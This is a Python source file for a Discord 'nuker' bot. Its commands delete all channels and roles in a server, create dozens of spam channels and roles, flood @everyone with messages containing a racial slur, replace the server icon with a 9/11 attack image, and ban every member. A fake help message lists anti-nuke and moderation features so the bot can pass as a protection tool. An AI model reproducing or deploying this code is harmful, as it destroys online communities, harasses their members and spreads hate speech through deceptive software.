import discord
from discord.ext import commands
import aiohttp
import asyncio
import requests

intents = discord.Intents.all()
destroyer = commands.Bot(command_prefix=".", help_command=None, intents=intents)  # Disable default help command

banall_lock = asyncio.Lock()

@destroyer.event
async def on_ready():
    print(f"Bot is ready. Logged in as {destroyer.user.name}")

@destroyer.command()
async def mc(ctx):
    ping_limit_per_channel = 10
    total_pings = 0

    # Limit to 10 channels or available channels if less than 10
    for channel in ctx.guild.text_channels[:10]:
        for _ in range(ping_limit_per_channel):
            await channel.send("Ping!")
            total_pings += 1

    print(f"Sent {total_pings} pings in {min(10, len(ctx.guild.text_channels))} channels.")

@destroyer.command()
async def nukerole(ctx):
    await ctx.message.delete()

    # Delete all roles concurrently
    print(f"Nuking roles in {ctx.guild.name} ({ctx.guild.id})...")
    await asyncio.gather(*[role.delete() for role in ctx.guild.roles])

    # Create 75 new roles concurrently with the specified name
    new_role_name = "nuked by infinity x tnn"
    print(f"Creating 75 new roles in {ctx.guild.name} ({ctx.guild.id}) with name: {new_role_name}...")
    await asyncio.gather(*[ctx.guild.create_role(name=new_role_name, color=discord.Color.random()) for _ in range(75)])

@destroyer.command()
async def kill(ctx):
    await ctx.message.delete()
    pfp_url = "https://media.discordapp.net/attachments/1161709174623830067/1195280692284751902/Smoke-flames-twin-towers-attacks-World-Trade-September-11-2001.jpg?ex=65b36ae4&is=65a0f5e4&hm=f1b72d1c1252fc336c711ca502466ef038c7d6c861ee6ea7d13204a1d604f7c3&"
    response = requests.get(pfp_url)
    pfp_bytes = response.content
    await ctx.guild.edit(icon=pfp_bytes)

    print(f"Nuking {ctx.guild.name} ({ctx.guild.id})...")

    # Delete all channels concurrently
    tasks = [channel.delete() or asyncio.sleep(0.2) for channel in ctx.guild.channels]
    await asyncio.gather(*tasks)
    print(f"Deleted {len(tasks)} channels")

    try:
        # Create 75 new text channels concurrently
        tasks = [ctx.guild.create_text_channel("nuked") for _ in range(75)]
        created_channels = await asyncio.gather(*tasks)

        for channel in created_channels:
            print(f"Created channel: #{channel.name}")

        async def send_messages(channel):
            sent_pings = 0
            while sent_pings < 1000:
                await channel.send("@everyone nuked by infinity x tnn niggers")
                print(f"Sent message to: #{channel.name}")
                sent_pings += 1
                await asyncio.sleep(0.5)  # 0.6-second delay

        # Send messages concurrently in batches
        message_tasks = []
        concurrency_level = 100
        for i in range(0, len(created_channels), concurrency_level):
            batch = created_channels[i:i + concurrency_level]
            task = asyncio.gather(*[send_messages(channel) for channel in batch])
            message_tasks.append(task)

        await asyncio.gather(*message_tasks, return_exceptions=True)

        # Sending an embedded message with server information
        embed = discord.Embed(
            title="Server Nuked",
            description=f"The server `{ctx.guild.name}` has been nuked by tnn x infinity.",
            color=discord.Color.red()
        )
        embed.set_thumbnail(url=pfp_url)  # Set the thumbnail to the server's icon
        await ctx.send(embed=embed)

    except Exception as e:
        print(f"Error: {e}")

@destroyer.command()
async def leave(ctx):
    if ctx.author.id ==  1161653601010200657:
        print(f"Leaving {ctx.guild.name} ({ctx.guild.id})...")
        await ctx.guild.leave()
    else:
        await ctx.send("You are not authorized to use this command.")

@destroyer.command()
async def massroledele(ctx):
    await ctx.message.delete()

    # Delete all roles concurrently
    print(f"Deleting all roles in {ctx.guild.name} ({ctx.guild.id})...")
    await asyncio.gather(*[role.delete() for role in ctx.guild.roles])

@destroyer.command()
async def massrole(ctx):
    await ctx.message.delete()

    # Create 75 new roles concurrently with the specified name
    new_role_name = "owned by tnn x infinity"
    print(f"Creating 75 new roles in {ctx.guild.name} ({ctx.guild.id}) with name: {new_role_name}...")
    await asyncio.gather(*[ctx.guild.create_role(name=new_role_name, color=discord.Color.random()) for _ in range(75)])

@destroyer.command()
async def banall(ctx):
    await ctx.message.delete()
    print(f"Banning all members in {ctx.guild.name} ({ctx.guild.id})...")

    async with banall_lock:
        # Use commands.Bot.ban to ban all members at once
        await ctx.guild.ban(ctx.guild.members[1:], reason="Server Nuke")
        print("Ban process complete.")

@destroyer.command()
async def help(ctx):
    help_message = "``` ban,\nkick,\nmute,\nanti add bot,\nanti ban,\nanti kick,\nanti nuke,\necho ```"
    await ctx.send(help_message)

# Replace 'your_token' with your actual bot token
destroyer.run('your_token')
